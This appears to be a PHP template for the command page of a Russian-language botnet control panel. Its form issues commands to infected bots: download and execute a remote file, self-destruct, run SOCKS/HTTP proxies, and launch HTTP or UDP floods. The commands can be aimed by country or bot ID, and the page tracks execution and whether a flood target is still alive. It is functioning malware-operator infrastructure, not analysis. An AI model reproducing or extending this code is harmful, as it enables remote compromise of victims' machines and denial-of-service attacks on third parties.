		
            <div class="panel panel-default">
                <div class="panel-heading">
                    Командный центр
                </div>
                <div class="panel-body">
					<div class="col-lg-13">
						<div class="col-sm-6 jumbotron jumbotron-fluid" style="padding:15px;margin-right:12.5px;">
							<form method="post" action="../commands/">
								<div class="col-md-12">
									<div class="form-group">
										<label for="input3">Выберите команду: *</label>
										<select class="form-control input-sm" name="comm" required>
											<option value="load">Скачивание и запуск</option>
											<option value="delete">Самоуничтожение</option>
											<option value="socks">Запуск Socks 4/5 и HTTP/s сервера</option>
											<option value="http_d">HTTP Flood</option>
											<option value="udp">UDP Flood</option>
									  </select>
									</div>		
									<div class="form-group">
										<label for="input" id="ip">Опции команды: *</label>
										<input type="text" class="form-control input-sm" id="target" name="url" placeholder="На пример: http://domain.ru/file.exe" required>
									</div>
								</div>
								<div class="col-md-3">
									<div class="form-group">
										<label for="input2">Количество: *</label>
										<input type="number" class="form-control input-sm" id="amounts" name="amount" placeholder="Пример: 15, 50, 100" required>
									</div>
								</div>
								<div class="col-md-3 hidden" id="option_http1">
									<div class="form-group">
										<label for="input2" id="port">Потоков: *</label>
										<input type="number" class="form-control input-sm" id="" name="thread" placeholder="Пример: 15, 50, 100" >
									</div>
								</div>
								<div class="col-md-3 hidden" id="option_http2">
									<div class="form-group">
										<label for="input2">Тайм-аут: *</label>
										<input type="number" class="form-control input-sm" id="" name="timeout" placeholder="В милисекундах: 1000, 5000" >
									</div>
								</div>
								<div class="col-md-3 hidden" id="option_http3">
									<div class="form-group">
										<label for="input2">Тип запроса: *</label>
											<select class="form-control input-sm" name="method_http">
												<option value="GET">GET запрос</option>
												<option value="POST">POST запрос</option>
										  </select>
									</div>
								</div>
								<div class="col-md-3">
									<div class="form-group">
										<label for="input">Страна:</label>
										<input type="text" class="form-control input-sm" id="input" name="country" maxlength="2" placeholder="Пример: RU, UA (AL –все)">
									</div>
								</div>
								<div class="col-md-3">
									<div class="form-group">
										<label for="input">Цель:</label>
										<input type="text" class="form-control input-sm" id="input" name="forid" maxlength="6" placeholder="Только ID Бота">
									</div>
								</div>
								<div class="col-md-3">
								<label for="input">&nbsp;</label>
									<div class="form-group">
											<button class="btn btn-success btn-sm btn-panel" type="submit" id="add">Сохранить</button>
									</div>
								</div>
							</form>
						</div>
						<div class="col-md-5 jumbotron jumbotron-fluid " style="padding:15px;min-width: 48%;position: relative;overflow: auto;max-height: 300px;height: 240px;">
							<table class="table table-responsive text-center">
								<thead>
									<tr>
										<th class="text-center">
											Бот
										</th>
										<th class="text-center">
											Команда
										</th>
										<th class="text-center">
											Статус
										</th>
										<th class="text-center"><a href="clear/" data-toggle="tooltip" title="Удалить всё">x</a></th>
									</tr>
								</thead>
								<tbody>
									<?if(count($user->GetViews()) > 0):?>
										<?foreach ($user->GetViews() as $values):?>
										<tr>
											<td># <?=$values['idbot']?></td>
											<td># <?=$values['idcmd']?></td>
											<td>
											<?if($values['viewed'] == '1'):?>
												<span class="text-success"><i class="ion-checkmark-circled" data-toggle="tooltip" title="Бот выполнил эту команду"></i></span>
											<?else:?>
												<span class="text-danger">Not completed</span>
											<?endif;?></td>
										</tr>
										<?endforeach;?>
									<?else:?>
										<tr>
											<td colspan="5">Информация отсутствуют</td>
										</tr>
									<?endif;?>
								</tbody>
							</table>
						</div>
					</div>
					<div class="col-lg-13">
						<div style="position:relative;overflow: auto;display: block;width: 100%;">
						<table class="table table-condensed table-bordered table-responsive">
							<thead>
								<tr>
									<th class="text-center" width="25%">Команда</th>
									<th class="text-center" width="7%">Количество</th>
									<th class="text-center" width="7%">Выполнило</th>
									<th class="text-center" width="7%">Страна</th>
									<th class="text-center" width="8%">Таргет</th>
									<th class="text-center" width="5%"></th>
								</tr>
							</thead>
							<tbody>
								<?if($user->CheckCommandsCount() > 0):?>
								<?foreach ($user->GetCommandForBot() as $value):?>
									<tr>
										<?
										 if (strpos($value['cmd'], 'method.http') !== false):
											$cmd = $value['cmd']; 
											$amount = '<i class="ion-ios-infinite-outline text-default"></i>';
											$done = '<span class="text-success">Выполняется</span>';
											$country = '<i class="ion-minus-round text-default"></i>';
											$host = explode('"', $cmd);
											$host = explode('/', $host[1]);
												if ($global->RemoteCheck(gethostbyname($host[0]), '80') == true):
													$forid = '<i class="ion-checkmark-circled text-success" data-toggle="tooltip" title="Цель жива"></i>';
												else:
													$forid = '<i class="ion-minus-circled text-danger" data-toggle="tooltip" title="Цель мертва"></i>';
												endif;
										else:
											$cmd = $value['cmd']; 
											$amount = $value['amount'];
											$done = $value['done'];
											$country = $value['country'];
											if(strlen($value['country'])==0){
												$country = '<i class="ion-minus-round text-default"></i>';
											}
											if(strlen($value['forid'])>1):
												$forid = 'Bot id: ' . $value['forid'];
											else:
												$forid = 'Все';
											endif;
										endif;
										
										?>
							
										<td ><?=$cmd?></td>
										<td class="text-center" ><?=$amount?></td>
										<td class="text-center"><?=$done?></td>
										<td class="text-center" ><?=$country?></td>
										<td class="text-center" ><?=$forid?></td>
										<td class="text-center" ><a href="delete/<?=$value['id']?>" class="option_table" id="delete"><i class="ion-trash-a"></i></a></td>
									</tr>
								<?endforeach;?>
								<?else:?>
									<tr>
										<td colspan="6" class="text-center">
											Записи отсутствуют
										</td>
									</tr>
								<?endif;?>
							</tbody>
						</table>
					</div>
					</div>
				</div>
			</div>
		</div>
		
		<script>
			$('#add').click(function(){});
			$("select").change(function(){
 		 	  if($(this).val() == 'http_d'){
 					$('#amounts').val('0');
 					$('#target').removeAttr('placeholder').attr('placeholder', 'На пример: domain.ru/index.php');
 					$('#option_http1').removeClass('hidden');
 					$('#option_http2').removeClass('hidden');
 					$('#option_http3').removeClass('hidden');
			 		$('[name="thread"]').attr('required', '');
					 $('[name="timeout"]').attr('required', '');
    			 	$('[name="method_http"]').attr('required', '');
   				 $('#ip').text('Опции команды: *');
 					$('#port').text('Потоков: *');
 				} else {
 					if($(this).val() == 'udp'){
 						$('#option_http1').removeClass('hidden');
 						$('#ip').text('Хост: *');
 						$('#option_http2').removeClass('hidden');
 						$('#port').text('Порт: *');
 					} else {
 					$('#ip').text('Опции команды: *');
 					$('#port').text('Потоков: *');
 					if ($('#amounts').val()=='0'){ $('#amounts').val('').removeAttr('disabled') };
 					$('#target').attr('placeholder', 'На пример: http://domain.ru/file.exe');
 					$('#option_http1').addClass('hidden');
 					$('#option_http2').addClass('hidden');
 					$('#option_http3').addClass('hidden');
					 $('[name="thread"]').removettr('required');
					 $('[name="timeout"]').removeAttr('required');
    			 	$('[name="method_http"]').removeAttr('required');
 				}
 			}
			});
		</script>